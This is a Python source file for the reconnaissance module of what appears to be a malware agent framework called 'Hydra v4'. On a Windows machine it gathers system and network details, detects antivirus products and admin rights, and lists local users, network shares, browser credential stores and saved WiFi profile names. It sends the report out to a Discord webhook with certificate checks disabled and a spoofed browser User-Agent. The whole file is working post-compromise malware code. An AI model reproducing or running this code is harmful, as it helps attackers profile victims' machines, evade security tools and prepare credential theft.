"""
Hydra v4 — Reconnaissance module.
Surveys the target, sends report to Discord.
"""
import os
import sys
import time
import json
import subprocess
import socket
import urllib.request
import ssl

_SSL_CTX = ssl._create_unverified_context()


def run_recon(cfg: dict, me: dict, webhook: str):
    """Run full recon and send report."""
    agent_id = me.get("id", "UNKNOWN")
    lines = [f"═══ HYDRA RECON [{agent_id}] ═══", f"Time: {time.ctime()}", ""]

    lines.append("── System ──")
    lines.extend(_sys_info())

    lines.append("── Network ──")
    lines.extend(_network_info())

    lines.append("── Security ──")
    lines.extend(_security_info())

    lines.append("── Users ──")
    lines.extend(_user_info())

    lines.append("── Shares ──")
    lines.extend(_share_info())

    lines.append("── Credential Stores ──")
    lines.extend(_cred_stores())

    # Send in chunks
    for chunk in [lines[i:i+15] for i in range(0, len(lines), 15)]:
        msg = "\n".join(chunk)
        try:
            _post_discord(webhook, msg)
        except:
            pass
        time.sleep(1)


def _sys_info() -> list:
    """Gather system info."""
    info = []
    try:
        r = subprocess.run("systeminfo", shell=True, capture_output=True, text=True, timeout=15)
        for line in r.stdout.split("\n")[:20]:
            line = line.strip()
            if line:
                info.append(line)
    except:
        info.append("systeminfo: FAILED")
    return info


def _network_info() -> list:
    """Gather network info."""
    info = []
    try:
        info.append(f"Hostname: {socket.gethostname()}")
        info.append(f"IP: {socket.gethostbyname(socket.gethostname())}")
    except:
        pass

    try:
        r = subprocess.run("ipconfig", shell=True, capture_output=True, text=True, timeout=10)
        for line in r.stdout.split("\n"):
            if any(k in line for k in ["IPv4", "IPv6", "Default Gateway", "DNS"]):
                info.append(line.strip())
    except:
        pass

    return info


def _security_info() -> list:
    """Detect installed security products."""
    info = []
    try:
        r = subprocess.run(
            'wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname /format:csv',
            shell=True, capture_output=True, text=True, timeout=10
        )
        for line in r.stdout.split("\n"):
            line = line.strip()
            if line and "displayname" not in line.lower() and "Node" not in line:
                info.append(f"AV: {line.split(',')[-1] if ',' in line else line}")
    except:
        info.append("AV detection: FAILED")

    if not info:
        info.append("AV: None detected or inaccessible")

    try:
        import ctypes
        info.append(f"Admin: {ctypes.windll.shell32.IsUserAnAdmin() != 0}")
    except:
        pass

    return info


def _user_info() -> list:
    """List local users."""
    info = []
    try:
        r = subprocess.run("net user", shell=True, capture_output=True, text=True, timeout=10)
        for line in r.stdout.split("\n"):
            line = line.strip()
            if line and "---" not in line and "command completed" not in line.lower():
                # Only list usernames (dashed lines separate sections)
                if line and not line.startswith("The command"):
                    info.append(line)
    except:
        pass
    return info


def _share_info() -> list:
    """List accessible network shares."""
    info = []
    try:
        r = subprocess.run("net view", shell=True, capture_output=True, text=True, timeout=15)
        for line in r.stdout.split("\n"):
            line = line.strip()
            if line.startswith("\\\\"):
                info.append(line)
    except:
        pass

    if not info:
        info.append("No network shares found")

    return info


def _cred_stores() -> list:
    """Check if browser credential stores exist (report only, don't read)."""
    info = []
    stores = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""),
                               "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""),
                             "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "Firefox": os.path.join(os.environ.get("APPDATA", ""),
                                "Mozilla", "Firefox", "Profiles"),
    }
    for browser, path in stores.items():
        exists = os.path.exists(path)
        info.append(f"{browser}: {'ACCESSIBLE' if exists else 'NOT FOUND'}")

    # Check for saved WiFi passwords
    try:
        r = subprocess.run(
            "netsh wlan show profiles", shell=True,
            capture_output=True, text=True, timeout=10
        )
        profiles = [l.split(":")[-1].strip()
                    for l in r.stdout.split("\n") if "All User Profile" in l]
        if profiles:
            info.append(f"WiFi profiles: {', '.join(profiles[:5])}")
    except:
        pass

    return info


def _post_discord(webhook: str, message: str):
    """Post to Discord webhook."""
    try:
        data = json.dumps({"content": f"```\n{message}\n```"}).encode()
        req = urllib.request.Request(webhook, data=data, headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        })
        urllib.request.urlopen(req, timeout=10, context=_SSL_CTX)
    except:
        pass
